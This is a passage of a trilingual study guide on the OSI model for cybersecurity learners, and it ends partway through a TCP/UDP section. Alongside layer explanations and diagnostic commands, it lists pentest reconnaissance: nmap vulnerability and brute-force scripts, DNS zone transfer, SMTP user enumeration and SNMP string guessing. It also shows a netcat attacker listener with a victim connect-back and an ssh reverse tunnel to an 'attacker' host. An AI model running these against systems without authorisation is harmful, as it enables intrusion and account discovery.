# 🌐 OSI Model — Networking Fundamentals

> **LearnCybersecurity** | Networking Fundamentals Series  
> 📅 Last Updated: 2026 | 👤 Author: kodoktheGr3at

---

## 📖 Daftar Isi / Table of Contents / 目次

| # | Topic | Bahasa Indonesia | English | 日本語 |
|---|-------|-----------------|---------|--------|
| 1 | Overview | Apa itu Model OSI | What is the OSI Model | OSIモデルとは |
| 2 | Layer 1 | Physical — Fisik | Physical Layer | 物理層 |
| 3 | Layer 2 | Data Link — Tautan Data | Data Link Layer | データリンク層 |
| 4 | Layer 3 | Network — Jaringan | Network Layer | ネットワーク層 |
| 5 | Layer 4 | Transport — Transport | Transport Layer | トランスポート層 |
| 6 | Layer 5 | Session — Sesi | Session Layer | セッション層 |
| 7 | Layer 6 | Presentation — Presentasi | Presentation Layer | プレゼンテーション層 |
| 8 | Layer 7 | Application — Aplikasi | Application Layer | アプリケーション層 |
| 9 | Enkapsulasi | Proses enkapsulasi data | Data Encapsulation | データのカプセル化 |
| 10 | TCP vs UDP | Perbandingan TCP & UDP | TCP vs UDP Comparison | TCPとUDPの比較 |
| 11 | Common Ports | Port-port penting | Important Ports | 重要なポート |
| 12 | Protokol Jaringan | Protokol di setiap layer | Protocols per Layer | 各層のプロトコル |
| 13 | Perangkat Jaringan | Perangkat di setiap layer | Network Devices per Layer | 各層のネットワーク機器 |
| 14 | Security Note | Serangan per layer | Attacks per Layer | 各層への攻撃 |
| 15 | Workflow | Analisis paket & rekon | Packet analysis & recon | パケット分析と偵察 |

---

## 1. 🏢 Overview — What Is the OSI Model

### 🇮🇩 Bahasa Indonesia
**OSI Model (Open Systems Interconnection Model)** adalah **kerangka konseptual standar** yang mendefinisikan cara sistem komunikasi jaringan bekerja, dibagi menjadi **7 lapisan (layer)**. Dikembangkan oleh **ISO (International Organization for Standardization)** pada tahun 1984.

Setiap layer memiliki tanggung jawab spesifik dan berkomunikasi hanya dengan layer di atas dan di bawahnya. Model ini bersifat **referensial** — implementasi nyata biasanya menggunakan **TCP/IP Model** (4 layer), namun OSI tetap menjadi standar untuk memahami, troubleshooting, dan analisis jaringan.

**Mengapa penting untuk cybersecurity:**
- Memahami **di layer mana serangan terjadi** → identifikasi vektor serangan
- Memahami **enkapsulasi data** → analisis paket & forensik jaringan
- Mengetahui **protokol per layer** → konfigurasi firewall dan IDS/IPS
- Memahami **perangkat jaringan** → network pentesting & reconnaissance
- Menganalisis **traffic aneh** → threat hunting & incident response

### 🇬🇧 English
The **OSI Model (Open Systems Interconnection Model)** is a **standardized conceptual framework** that defines how network communication systems work, divided into **7 layers**. Developed by the **ISO (International Organization for Standardization)** in 1984.

Each layer has specific responsibilities and only communicates with the layers directly above and below it. The model is **referential** — real implementations typically use the **TCP/IP Model** (4 layers), but OSI remains the standard for understanding, troubleshooting, and network analysis.

**Why it matters for cybersecurity:**
- Understanding **at which layer attacks occur** → attack vector identification
- Understanding **data encapsulation** → packet analysis & network forensics
- Knowing **protocols per layer** → firewall and IDS/IPS configuration
- Understanding **network devices** → network pentesting & reconnaissance
- Analyzing **abnormal traffic** → threat hunting & incident response

### 🇯🇵 日本語
**OSIモデル（開放型システム間相互接続モデル）**は、ネットワーク通信システムがどのように機能するかを定義する**標準化された概念フレームワーク**で、**7つの層（レイヤー）**に分かれています。1984年に**ISO（国際標準化機構）**によって開発されました。

各層は特定の責任を持ち、直上と直下の層とのみ通信します。このモデルは**参照用** — 実際の実装では通常**TCP/IPモデル**（4層）が使われますが、OSIはネットワークの理解、トラブルシューティング、分析の標準として残っています。

**サイバーセキュリティにとって重要な理由：**
- **攻撃がどの層で発生するか**を理解する → 攻撃ベクターの特定
- **データのカプセル化**を理解する → パケット分析とネットワークフォレンジクス
- **各層のプロトコル**を知る → ファイアウォールとIDS/IPSの設定
- **ネットワーク機器**を理解する → ネットワークペンテストと偵察
- **異常なトラフィック**を分析する → 脅威ハンティングとインシデントレスポンス

---

## 🗺️ OSI Model — Visual Overview

```
┌─────────────────────────────────────────────────────────────────────────┐
│                          OSI MODEL (7 Layers)                           │
├───────┬──────────────────┬────────────────────────────────────────────┤
│ Layer │   Name           │  Key Responsibilities                       │
├───────┼──────────────────┼────────────────────────────────────────────┤
│   7   │  Application     │  User-facing protocols (HTTP, FTP, DNS)    │
│   6   │  Presentation    │  Encoding, encryption, compression         │
│   5   │  Session         │  Connection management, authentication     │
│   4   │  Transport       │  TCP/UDP, ports, flow control              │
│   3   │  Network         │  IP addressing, routing                    │
│   2   │  Data Link       │  MAC addresses, switches, frames           │
│   1   │  Physical        │  Cables, signals, bits                     │
└───────┴──────────────────┴────────────────────────────────────────────┘

                    Data Unit (PDU) per Layer:
┌─────────────────────────────────────────────────┐
│  Layer 7 — Application   →  Data                │
│  Layer 6 — Presentation  →  Data                │
│  Layer 5 — Session       →  Data                │
│  Layer 4 — Transport     →  Segment (TCP)        │
│                             Datagram (UDP)        │
│  Layer 3 — Network       →  Packet              │
│  Layer 2 — Data Link     →  Frame               │
│  Layer 1 — Physical      →  Bits (0s and 1s)    │
└─────────────────────────────────────────────────┘

Mnemonics to remember layers (top to bottom):
  🇬🇧 "All People Seem To Need Data Processing"
  🇮🇩 "Anak Pintar Selalu Tahu Nama Daftar Protokol"
  🇯🇵 「アプリは プレゼン セッションを トランス ネット データ 物理で動く」
```

---

## 2. ⚡ Layer 1 — Physical Layer

### 🇮🇩 Bahasa Indonesia
**Layer Physical** adalah lapisan paling bawah dalam model OSI. Bertanggung jawab atas **transmisi bit mentah (0 dan 1)** melalui media fisik. Layer ini tidak peduli dengan makna data — hanya memindahkan sinyal listrik, optik, atau radio dari satu titik ke titik lain.

**Komponen utama:**
- Kabel (Ethernet, fiber optic, coaxial)
- Sinyal elektrik, cahaya, atau gelombang radio
- Konektor dan port fisik (RJ45, SFP, BNC)
- Perangkat repeater dan hub

### 🇬🇧 English
The **Physical Layer** is the lowest layer in the OSI model. It is responsible for the **transmission of raw bits (0s and 1s)** across physical media. This layer does not care about the meaning of data — it simply moves electrical, optical, or radio signals from one point to another.

**Key components:**
- Cables (Ethernet, fiber optic, coaxial)
- Electrical, light, or radio wave signals
- Physical connectors and ports (RJ45, SFP, BNC)
- Repeater and hub devices

### 🇯🇵 日本語
**物理層**はOSIモデルの最下層です。物理媒体を通じて**生のビット（0と1）を伝送する**役割を担います。この層はデータの意味を気にせず、電気、光、または電波信号を一点から別の点へ移動させるだけです。

**主要コンポーネント：**
- ケーブル（イーサネット、光ファイバー、同軸）
- 電気信号、光、または電波
- 物理コネクタとポート（RJ45、SFP、BNC）
- リピーターとハブ機器

```bash
# Physical layer related commands

# Check network interface status (link up/down = physical layer)
$ ip link show
$ ifconfig
$ ethtool eth0          # NIC speed, duplex, link status

# Windows equivalent
> ipconfig /all
> Get-NetAdapter         # PowerShell

# Check cable / physical connection
$ ethtool eth0 | grep "Link detected"
Link detected: yes

# Check interface errors (physical issues)
$ ip -s link show eth0
$ netstat -i
$ cat /proc/net/dev

# Wireshark — capture at physical/data link level
$ tcpdump -i eth0 -n    # capture raw frames
$ wireshark             # GUI packet capture
```

| Media | 🇮🇩 Kecepatan | 🇬🇧 Speed | 🇯🇵 速度 | 🇮🇩 Jarak Maks | 🇬🇧 Max Distance | 🇯🇵 最大距離 |
|-------|------------|---------|--------|-------------|----------------|-----------|
| Cat5e UTP | 1 Gbps | 1 Gbps | 1 Gbps | 100 meter | 100 meters | 100メートル |
| Cat6 UTP | 10 Gbps | 10 Gbps | 10 Gbps | 55 meter | 55 meters | 55メートル |
| Fiber Single-mode | 100 Gbps+ | 100 Gbps+ | 100 Gbps以上 | 40–80 km | 40–80 km | 40〜80 km |
| Fiber Multi-mode | 10 Gbps | 10 Gbps | 10 Gbps | 550 meter | 550 meters | 550メートル |
| Wi-Fi 6 (802.11ax) | 9.6 Gbps | 9.6 Gbps | 9.6 Gbps | ~100 meter | ~100 meters | 約100メートル |

---

## 3. 🔗 Layer 2 — Data Link Layer

### 🇮🇩 Bahasa Indonesia
**Layer Data Link** bertanggung jawab atas **transfer data yang dapat diandalkan** antara dua node yang terhubung langsung dalam satu jaringan (same network segment). Layer ini menggunakan **MAC Address (Media Access Control)** untuk mengidentifikasi perangkat dan mengelola akses ke media fisik.

Layer ini dibagi menjadi dua sub-layer:
- **LLC (Logical Link Control)** — kontrol aliran dan error checking
- **MAC (Media Access Control)** — pengalamatan fisik dan akses media

### 🇬🇧 English
The **Data Link Layer** is responsible for **reliable data transfer** between two directly connected nodes within the same network segment. This layer uses **MAC Addresses (Media Access Control)** to identify devices and manages access to the physical media.

This layer is divided into two sub-layers:
- **LLC (Logical Link Control)** — flow control and error checking
- **MAC (Media Access Control)** — physical addressing and media access

### 🇯🇵 日本語
**データリンク層**は同じネットワークセグメント内で直接接続された2つのノード間の**信頼できるデータ転送**を担当します。この層はデバイスを識別するために**MACアドレス（メディアアクセス制御）**を使い、物理メディアへのアクセスを管理します。

この層は2つのサブレイヤーに分かれています：
- **LLC（論理リンク制御）** — フロー制御とエラーチェック
- **MAC（メディアアクセス制御）** — 物理アドレッシングとメディアアクセス

```bash
# Data Link layer commands

# View MAC addresses
$ ip link show
$ arp -a                  # ARP table (IP ↔ MAC mapping)
$ arp -n

# Windows
> arp -a
> getmac /v

# ARP spoofing detection (Wireshark filter)
# Filter: arp.duplicate-address-detected
# Filter: arp.src.hw_mac != eth.src

# Send raw Ethernet frames (Layer 2) with Scapy (Python)
$ python3
>>> from scapy.all import *
>>> frame = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst="192.168.1.1")
>>> sendp(frame, iface="eth0")

# View switch MAC address table (if you have access)
# Cisco: show mac address-table
# Linux bridge: bridge fdb show

# 802.1Q VLAN tagging
$ ip link add link eth0 name eth0.100 type vlan id 100
$ ip addr add 192.168.100.1/24 dev eth0.100

# Capture Layer 2 traffic
$ tcpdump -e -i eth0      # -e shows MAC addresses
```

| Protocol | 🇮🇩 Fungsi | 🇬🇧 Function | 🇯🇵 機能 | Pentest Value |
|----------|-----------|-------------|---------|--------------|
| **ARP** | Resolusi IP → MAC | IP → MAC resolution | IPからMACへの解決 | 🔴 Critical (ARP Spoofing) |
| **Ethernet II** | Frame standar LAN | Standard LAN frame | 標準LANフレーム | 🟡 Medium |
| **802.1Q** | VLAN tagging | VLAN tagging | VLANタグ付け | 🟠 High (VLAN Hopping) |
| **STP (802.1D)** | Cegah loop jaringan | Prevent network loops | ネットワークループ防止 | 🟠 High (STP Attack) |
| **PPP** | Point-to-point link | Point-to-point link | ポイントツーポイントリンク | 🟢 Low |

---

## 4. 🌐 Layer 3 — Network Layer

### 🇮🇩 Bahasa Indonesia
**Layer Network** bertanggung jawab atas **routing dan pengalamatan logis (IP Address)**. Menentukan jalur terbaik untuk mengirimkan paket data dari sumber ke tujuan melewati beberapa jaringan yang berbeda. Perangkat utama di layer ini adalah **Router**.

Unit data di layer ini disebut **Packet (Paket)**.

### 🇬🇧 English
The **Network Layer** is responsible for **routing and logical addressing (IP Addresses)**. It determines the best path to deliver data packets from source to destination across multiple different networks. The primary device at this layer is the **Router**.

The data unit at this layer is called a **Packet**.

### 🇯🇵 日本語
**ネットワーク層**は**ルーティングと論理アドレッシング（IPアドレス）**を担当します。複数の異なるネットワークを越えて、送信元から宛先へデータパケットを届ける最適なパスを決定します。この層の主要機器は**ルーター**です。

この層のデータ単位は**パケット**と呼ばれます。

```bash
# Network layer commands

# IP addressing
$ ip addr show
$ ip addr add 192.168.1.10/24 dev eth0

# Routing table
$ ip route show
$ route -n
$ netstat -rn

# Windows
> route print
> Get-NetRoute

# Ping — ICMP echo (Layer 3 reachability test)
$ ping 8.8.8.8
$ ping -c 4 192.168.1.1   # 4 packets only

# Traceroute — show routing path
$ traceroute 8.8.8.8       # Linux/Mac
> tracert 8.8.8.8          # Windows
$ mtr 8.8.8.8              # real-time traceroute

# IP Subnet calculations
$ ipcalc 192.168.1.0/24
$ python3 -c "import ipaddress; print(list(ipaddress.IPv4Network('10.0.0.0/28').hosts()))"

# Wireshark filter for IP layer
# ip.addr == 192.168.1.1
# ip.src == 10.0.0.0/8
# icmp

# Nmap — Layer 3/4 scanning
$ nmap -sn 192.168.1.0/24         # Ping sweep (host discovery)
$ nmap -sP 192.168.1.0/24         # ARP + ICMP discovery
$ nmap -O 192.168.1.1             # OS detection (TTL analysis)
```

| Protocol | 🇮🇩 Fungsi | 🇬🇧 Function | 🇯🇵 機能 | Pentest Value |
|----------|-----------|-------------|---------|--------------|
| **IPv4** | Pengalamatan 32-bit | 32-bit addressing | 32ビットアドレッシング | 🔴 High |
| **IPv6** | Pengalamatan 128-bit | 128-bit addressing | 128ビットアドレッシング | 🟠 High |
| **ICMP** | Pesan kontrol & error | Control & error messages | 制御とエラーメッセージ | 🟠 High (ICMP Flood) |
| **OSPF** | Protokol routing dinamis | Dynamic routing protocol | 動的ルーティングプロトコル | 🟡 Medium |
| **BGP** | Routing antar-AS | Inter-AS routing | AS間ルーティング | 🔴 High (BGP Hijack) |
| **IPSec** | Enkripsi & auth IP | IP encryption & auth | IP暗号化と認証 | 🟢 Low |

---

## 5. 📦 Layer 4 — Transport Layer

### 🇮🇩 Bahasa Indonesia
**Layer Transport** bertanggung jawab atas **komunikasi end-to-end** antara aplikasi pada host yang berbeda. Layer ini menggunakan **Port Number** untuk mengidentifikasi layanan/aplikasi yang berkomunikasi, serta menyediakan mekanisme **flow control**, **error recovery**, dan **segmentasi data**.

Dua protokol utama:
- **TCP (Transmission Control Protocol)** — connection-oriented, reliable, ordered
- **UDP (User Datagram Protocol)** — connectionless, fast, no guarantee

### 🇬🇧 English
The **Transport Layer** is responsible for **end-to-end communication** between applications on different hosts. This layer uses **Port Numbers** to identify communicating services/applications, and provides **flow control**, **error recovery**, and **data segmentation** mechanisms.

Two main protocols:
- **TCP (Transmission Control Protocol)** — connection-oriented, reliable, ordered
- **UDP (User Datagram Protocol)** — connectionless, fast, no guarantee

### 🇯🇵 日本語
**トランスポート層**は異なるホスト上のアプリケーション間の**エンドツーエンド通信**を担当します。この層は通信するサービス/アプリケーションを識別するために**ポート番号**を使い、**フロー制御**、**エラー回復**、**データセグメンテーション**のメカニズムを提供します。

2つの主要プロトコル：
- **TCP（伝送制御プロトコル）** — 接続指向、信頼性あり、順序保証
- **UDP（ユーザーデータグラムプロトコル）** — コネクションレス、高速、保証なし

```bash
# Transport layer commands

# View open ports & connections
$ ss -tulnp               # preferred (modern)
$ netstat -tulnp           # traditional
$ netstat -ano             # Windows

# Windows PowerShell
PS> Get-NetTCPConnection
PS> Get-NetUDPEndpoint

# TCP 3-way handshake (SYN-SYN/ACK-ACK)
# Wireshark filter: tcp.flags.syn==1
# Wireshark filter: tcp.stream eq 0

# Port scanning with Nmap
$ nmap -sT 192.168.1.1         # TCP connect scan (full handshake)
$ nmap -sS 192.168.1.1         # SYN stealth scan (half-open)
$ nmap -sU 192.168.1.1         # UDP scan
$ nmap -p 80,443,8080 192.168.1.1   # specific ports
$ nmap -p- 192.168.1.1         # all 65535 ports
$ nmap -sV 192.168.1.1         # service version detection

# Netcat — TCP/UDP raw connections
$ nc -lvnp 4444               # listen (attacker)
$ nc 192.168.1.10 4444        # connect (victim → attacker)
$ nc -u 192.168.1.1 53        # UDP mode
$ nc -zv 192.168.1.1 22       # port check (banner grab)

# Banner grabbing
$ nc -nv 192.168.1.1 80
HEAD / HTTP/1.0

# Check for SYN flood (DoS attack detection)
$ netstat -an | grep SYN_RECV | wc -l
```

### 🔑 TCP vs UDP Comparison

| Feature | TCP | UDP |
|---------|-----|-----|
| 🇮🇩 Koneksi | Connection-oriented (3-way handshake) | Connectionless |
| 🇬🇧 Connection | Connection-oriented (3-way handshake) | Connectionless |
| 🇯🇵 接続 | 接続指向（3ウェイハンドシェイク） | コネクションレス |
| 🇮🇩 Keandalan | Dijamin, ada ACK | Tidak dijamin, fire & forget |
| 🇬🇧 Reliability | Guaranteed, uses ACK | No guarantee, fire & forget |
| 🇯🇵 信頼性 | 保証あり、ACKあり | 保証なし |
| 🇮🇩 Urutan | Terurut (ordered) | Tidak terurut |
| 🇬🇧 Ordering | Ordered delivery | Out-of-order possible |
| 🇯🇵 順序 | 順序保証あり | 順序不保証 |
| 🇮🇩 Kecepatan | Lebih lambat (overhead) | Lebih cepat |
| 🇬🇧 Speed | Slower (overhead) | Faster |
| 🇯🇵 速度 | 遅い（オーバーヘッドあり） | 速い |
| 🇮🇩 Penggunaan | HTTP, SSH, FTP, Email | DNS, DHCP, VoIP, Video streaming |
| 🇬🇧 Use Cases | HTTP, SSH, FTP, Email | DNS, DHCP, VoIP, Video streaming |
| 🇯🇵 用途 | HTTP、SSH、FTP、メール | DNS、DHCP、VoIP、動画ストリーミング |

### TCP 3-Way Handshake
```
Client                          Server
  │                               │
  │──── SYN (seq=100) ───────────>│   Step 1: Client initiates
  │                               │
  │<─── SYN+ACK (seq=200,ack=101)─│   Step 2: Server acknowledges + syncs
  │                               │
  │──── ACK (ack=201) ───────────>│   Step 3: Client acknowledges
  │                               │
  │<════ DATA TRANSFER ══════════>│   Connection established!
  │                               │
  │──── FIN ─────────────────────>│   Step 4: Teardown (4-way)
  │<─── ACK ──────────────────────│
  │<─── FIN ──────────────────────│
  │──── ACK ─────────────────────>│   Connection closed
```

---

## 6. 🤝 Layer 5 — Session Layer

### 🇮🇩 Bahasa Indonesia
**Layer Session** bertanggung jawab untuk **membangun, mengelola, dan mengakhiri sesi komunikasi** antara aplikasi. Layer ini memastikan bahwa jika koneksi terputus, sesi dapat dilanjutkan dari tempat yang tepat (checkpointing). Layer ini juga mengatur **dialog control** (half-duplex vs full-duplex).

### 🇬🇧 English
The **Session Layer** is responsible for **establishing, managing, and terminating communication sessions** between applications. This layer ensures that if a connection is interrupted, the session can resume from the right point (checkpointing). It also controls **dialog control** (half-duplex vs full-duplex).

### 🇯🇵 日本語
**セッション層**はアプリケーション間の**通信セッションの確立、管理、終了**を担当します。この層は接続が中断された場合に、適切な場所からセッションを再開できるようにします（チェックポイント）。また**ダイアログ制御**（半二重 vs 全二重）も管理します。

```bash
# Session layer examples

# NetBIOS — Session Layer protocol (Windows networking)
$ nmblookup -A 192.168.1.1    # NetBIOS name lookup
$ nbtscan 192.168.1.0/24      # scan for NetBIOS names

# RPC (Remote Procedure Call) — Session layer
$ rpcinfo -p 192.168.1.1      # list RPC services
$ showmount -e 192.168.1.1    # NFS shares (uses RPC)

# SMB Session (Windows file sharing)
$ smbclient -L //192.168.1.1  # list SMB shares
$ smbclient //192.168.1.1/share -U username

# Session hijacking detection (Wireshark)
# Filter: tcp.seq or unexpected RST packets
# Look for duplicate SEQ numbers

# SQL*Net (Oracle DB sessions) — port 1521
# iSCSI sessions — port 3260

# SSH — manages sessions with keep-alive
$ ssh -o ServerAliveInterval=60 user@host
```

| Protocol | 🇮🇩 Fungsi | 🇬🇧 Function | 🇯🇵 機能 | Pentest Value |
|----------|-----------|-------------|---------|--------------|
| **NetBIOS** | Layanan nama Windows | Windows naming service | Windows名前解決 | 🔴 High |
| **RPC** | Panggilan prosedur jarak jauh | Remote procedure calls | リモートプロシージャコール | 🟠 High |
| **SMB** | Berbagi file Windows | Windows file sharing | Windowsファイル共有 | 🔴 Critical |
| **SQL*Net** | Sesi database Oracle | Oracle DB sessions | OracleDBセッション | 🟡 Medium |
| **iSCSI** | Storage over network | Storage over network | ネットワーク越しのストレージ | 🟡 Medium |

---

## 7. 🔐 Layer 6 — Presentation Layer

### 🇮🇩 Bahasa Indonesia
**Layer Presentation** adalah "penerjemah" jaringan. Bertanggung jawab atas **format data, enkripsi/dekripsi, dan kompresi**. Layer ini memastikan bahwa data yang dikirim oleh satu aplikasi dapat dibaca oleh aplikasi lain meskipun format internalnya berbeda.

**Tanggung jawab utama:**
- **Encoding/Decoding** — ASCII, Unicode, EBCDIC
- **Enkripsi/Dekripsi** — SSL/TLS beroperasi di sini
- **Kompresi/Dekompresi** — gzip, zlib

### 🇬🇧 English
The **Presentation Layer** is the "translator" of the network. It is responsible for **data formatting, encryption/decryption, and compression**. This layer ensures that data sent by one application can be read by another even if their internal formats differ.

**Main responsibilities:**
- **Encoding/Decoding** — ASCII, Unicode, EBCDIC
- **Encryption/Decryption** — SSL/TLS operates here
- **Compression/Decompression** — gzip, zlib

### 🇯🇵 日本語
**プレゼンテーション層**はネットワークの「翻訳者」です。**データフォーマット、暗号化/復号、圧縮**を担当します。内部フォーマットが異なっても、あるアプリケーションが送ったデータを別のアプリケーションが読めるようにします。

**主な責任：**
- **エンコード/デコード** — ASCII、Unicode、EBCDIC
- **暗号化/復号** — SSL/TLSがここで動作
- **圧縮/解凍** — gzip、zlib

```bash
# Presentation layer — encoding, encryption, compression

# Base64 encoding/decoding
$ echo "Hello World" | base64
SGVsbG8gV29ybGQK
$ echo "SGVsbG8gV29ybGQK" | base64 -d
Hello World

# URL encoding
$ python3 -c "import urllib.parse; print(urllib.parse.quote('hello world'))"
hello%20world

# SSL/TLS certificate inspection (HTTPS = TLS at Presentation layer)
$ openssl s_client -connect google.com:443
$ openssl s_client -connect target.com:443 </dev/null 2>/dev/null | openssl x509 -noout -text

$ curl -v https://google.com 2>&1 | grep -E "SSL|TLS|cipher"

# Check SSL/TLS version & ciphers (pentesting)
$ nmap --script ssl-enum-ciphers -p 443 target.com
$ sslscan target.com
$ testssl.sh target.com

# Identify file encoding/format
$ file suspicious.bin
$ xxd suspicious.bin | head -20     # hex dump
$ strings suspicious.bin | head -20  # extract strings

# Common encoding conversions (Python)
$ python3 -c "
data = 'Hello'
print('Base64:', __import__('base64').b64encode(data.encode()).decode())
print('Hex:', data.encode().hex())
print('URL:', __import__('urllib.parse').quote(data))
"
```

| Format / Protocol | 🇮🇩 Fungsi | 🇬🇧 Function | 🇯🇵 機能 | Pentest Value |
|------------------|-----------|-------------|---------|--------------|
| **SSL/TLS** | Enkripsi transport | Transport encryption | トランスポート暗号化 | 🔴 High (SSLstrip, downgrade) |
| **ASCII/Unicode** | Encoding teks | Text encoding | テキストエンコーディング | 🟡 Medium |
| **Base64** | Encoding binary ke teks | Binary to text encoding | バイナリからテキストエンコーディング | 🟠 High (payload obfuscation) |
| **gzip/zlib** | Kompresi data | Data compression | データ圧縮 | 🟢 Low |
| **JPEG/PNG/GIF** | Format gambar | Image formats | 画像フォーマット | 🟡 Medium (steganography) |
| **MIME** | Format email multipart | Email multipart format | メールマルチパートフォーマット | 🟡 Medium |

---

## 8. 💻 Layer 7 — Application Layer

### 🇮🇩 Bahasa Indonesia
**Layer Application** adalah layer tertinggi dalam model OSI dan **satu-satunya layer yang berinteraksi langsung dengan pengguna akhir**. Layer ini menyediakan antarmuka antara aplikasi dan jaringan, serta mendefinisikan protokol yang digunakan oleh aplikasi untuk berkomunikasi.

> ⚠️ Layer Application **bukan** berarti aplikasi itu sendiri (seperti Chrome atau Firefox) — melainkan protokol jaringan yang digunakan oleh aplikasi tersebut.

### 🇬🇧 English
The **Application Layer** is the highest layer in the OSI model and **the only layer that directly interacts with the end user**. It provides the interface between applications and the network, and defines the protocols used by applications to communicate.

> ⚠️ The Application Layer does **not** mean the application itself (like Chrome or Firefox) — rather, the network protocols those applications use.

### 🇯🇵 日本語
**アプリケーション層**はOSIモデルの最上層で、**エンドユーザーと直接やりとりする唯一の層**です。アプリケーションとネットワーク間のインターフェースを提供し、アプリケーションが通信するために使うプロトコルを定義します。

> ⚠️ アプリケーション層はアプリケーション自体（ChromeやFirefoxなど）を意味**しません** — むしろ、それらのアプリケーションが使うネットワークプロトコルのことです。

```bash
# Application layer — common protocols & tools

# HTTP / HTTPS
$ curl -v http://target.com                  # verbose HTTP request
$ curl -X POST -d "user=admin&pass=123" http://target.com/login
$ wget http://target.com/file.txt

# DNS — Domain Name System
$ dig google.com                             # full DNS lookup
$ dig google.com A                           # IPv4 record
$ dig google.com MX                          # Mail exchange
$ dig google.com NS                          # Name servers
$ dig @8.8.8.8 google.com                   # use specific DNS server
$ host google.com
$ nslookup google.com

# DNS zone transfer (pentesting!)
$ dig axfr @ns1.target.com target.com
$ fierce --domain target.com                # DNS brute force

# FTP
$ ftp 192.168.1.1
$ ftp -n 192.168.1.1 <<EOF
  user anonymous ""
  ls
  bye
EOF

# SSH
$ ssh user@192.168.1.1
$ ssh -p 2222 user@192.168.1.1              # non-default port
$ ssh -L 8080:internal:80 user@bastion      # local port forward
$ ssh -R 4444:localhost:4444 user@attacker  # reverse tunnel

# SMTP — Email
$ nc -v mail.target.com 25
EHLO test.com
VRFY admin@target.com                       # user enumeration!

# SNMP — Network Management
$ snmpwalk -c public -v 2c 192.168.1.1     # community string: public
$ onesixtyone -c /usr/share/doc/onesixtyone/dict.txt 192.168.1.1

# Application layer scanning (Nmap scripts)
$ nmap --script http-title -p 80,443 192.168.1.0/24
$ nmap --script http-robots.txt target.com
$ nmap --script smtp-enum-users target.com
$ nmap --script dns-brute target.com
$ nmap --script ftp-anon target.com         # anonymous FTP check
$ nmap --script smb-vuln-* 192.168.1.1     # SMB vulnerabilities
```

| Protocol | Port | 🇮🇩 Fungsi | 🇬🇧 Function | 🇯🇵 機能 | Pentest Value |
|----------|------|-----------|-------------|---------|--------------|
| **HTTP** | 80 | Web tidak terenkripsi | Unencrypted web | 非暗号化Web | 🔴 High |
| **HTTPS** | 443 | Web terenkripsi | Encrypted web | 暗号化Web | 🟠 High |
| **DNS** | 53 | Resolusi nama domain | Domain name resolution | ドメイン名解決 | 🔴 High |
| **FTP** | 21 | Transfer file (cleartext) | File transfer (cleartext) | ファイル転送（平文） | 🔴 Critical |
| **SSH** | 22 | Shell aman | Secure shell | セキュアシェル | 🟠 High |
| **Telnet** | 23 | Shell tidak aman | Insecure shell | 非セキュアシェル | 🔴 Critical |
| **SMTP** | 25 | Kirim email | Send email | メール送信 | 🟠 High |
| **POP3** | 110 | Ambil email | Retrieve email | メール取得 | 🟡 Medium |
| **IMAP** | 143 | Kelola email | Manage email | メール管理 | 🟡 Medium |
| **SNMP** | 161 | Manajemen jaringan | Network management | ネットワーク管理 | 🔴 High |
| **LDAP** | 389 | Directory service | Directory service | ディレクトリサービス | 🔴 High |
| **RDP** | 3389 | Remote desktop | Remote desktop | リモートデスクトップ | 🔴 Critical |
| **SMB** | 445 | File sharing Windows | Windows file sharing | Windowsファイル共有 | 🔴 Critical |
| **MSSQL** | 1433 | SQL Server | SQL Server | SQL Server | 🔴 High |
| **MySQL** | 3306 | MySQL database | MySQL database | MySQLデータベース | 🔴 High |
| **RPC** | 135 | Remote procedure call | Remote procedure call | リモートプロシージャコール | 🟠 High |

---

## 9. 📦 Data Encapsulation — Enkapsulasi Data

### 🇮🇩 Bahasa Indonesia
**Enkapsulasi** adalah proses di mana setiap layer OSI **menambahkan header (dan kadang trailer)** ke data sebelum diteruskan ke layer di bawahnya. Proses sebaliknya disebut **de-enkapsulasi**, yang terjadi di sisi penerima.

### 🇬🇧 English
**Encapsulation** is the process where each OSI layer **adds a header (and sometimes a trailer)** to the data before passing it to the layer below. The reverse process is called **de-encapsulation**, which happens on the receiving side.

### 🇯🇵 日本語
**カプセル化**は各OSI層が下の層に渡す前にデータに**ヘッダー（時にはトレーラー）を追加する**プロセスです。逆のプロセスは**デカプセル化**と呼ばれ、受信側で行われます。

```
Sender (Encapsulation)                    Receiver (De-encapsulation)
──────────────────────────────────────────────────────────────────────

Layer 7 — Application                     Layer 7 — Application
┌─────────────────────────┐               ┌─────────────────────────┐
│         DATA            │               │         DATA            │
└─────────────────────────┘               └─────────────────────────┘
            ↓ Add L7 header                           ↑ Remove L7 header

Layer 6 — Presentation                    Layer 6 — Presentation
┌──────┬──────────────────┐               ┌──────┬──────────────────┐
│  L6H │       DATA       │               │  L6H │       DATA       │
└──────┴──────────────────┘               └──────┴──────────────────┘
            ↓ Add L5 header                           ↑ Remove L5 header

Layer 5 — Session                         Layer 5 — Session
┌───┬──┬──────────────────┐               ┌───┬──┬──────────────────┐
│L5H│L6│       DATA       │               │L5H│L6│       DATA       │
└───┴──┴──────────────────┘               └───┴──┴──────────────────┘
            ↓ Add TCP/UDP header                       ↑ Remove L4 header

Layer 4 — Transport     [SEGMENT]         Layer 4 — Transport
┌─────────────┬───────────────────────┐   ┌─────────────┬──────────┐
│  TCP Header │     DATA (Payload)    │   │  TCP Header │  Data    │
│ src/dst port│                       │   └─────────────┴──────────┘
└─────────────┴───────────────────────┘
            ↓ Add IP header                            ↑ Remove IP header

Layer 3 — Network       [PACKET]          Layer 3 — Network
┌──────────┬──────────────────────────┐   ┌──────────┬─────────────┐
│ IP Header│   TCP Header + Data      │   │ IP Header│    Data     │
│ src/dst IP│                         │   └──────────┴─────────────┘
└──────────┴──────────────────────────┘
            ↓ Add MAC header + trailer                 ↑ Remove MAC frame

Layer 2 — Data Link     [FRAME]           Layer 2 — Data Link
┌──────────┬────────────────────┬──────┐  ┌──────────┬──────┬──────┐
│MAC Header│ IP + TCP + Data    │FCS   │  │MAC Header│ Data │ FCS  │
│src/dst MAC│                  │(CRC) │  └──────────┴──────┴──────┘
└──────────┴────────────────────┴──────┘
            ↓ Convert to bits                          ↑ Convert from bits

Layer 1 — Physical      [BITS]            Layer 1 — Physical
  01001000 01100101 01101100 01101100 ...   01001000 01100101 ...

                    ──── Physical medium ────>
```

---

## 10. 🔄 TCP vs UDP — Deep Comparison

```bash
# TCP connection analysis
$ tcpdump -i eth0 'tcp and host 192.168.1.1'

# Wireshark filters — TCP
# tcp.flags.syn == 1 and tcp.flags.ack == 0   → SYN (new connections)
# tcp.flags.fin == 1                          → FIN (connection closing)
# tcp.flags.rst == 1                          → RST (reset / port closed)
# tcp.analysis.retransmission                 → retransmissions (packet loss)

# Wireshark filters — UDP
# udp.port == 53     → DNS traffic
